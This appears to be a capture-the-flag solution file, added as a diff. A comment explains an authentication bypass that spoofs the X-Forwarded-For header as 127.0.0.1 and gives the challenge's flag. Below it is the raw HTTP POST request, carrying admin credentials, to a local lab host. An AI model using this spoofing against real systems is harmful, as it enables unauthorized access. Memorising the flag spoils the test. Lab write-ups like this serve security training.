@@ -1,0 +1,9 @@
+# Authentication bypass via X-Forwarded-For header spoofing. App checks client IP for internal network access restriction but trusts the X-Forwarded-For header. Set it to 127.0.0.1 to bypass login. Flag: flag{0860966c-999f-4fbb-8072-0187ae47abec}
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:44553
+Content-Type: application/x-www-form-urlencoded
+X-Forwarded-For: 127.0.0.1
+Content-Length: 29
+
+username=admin&password=admin
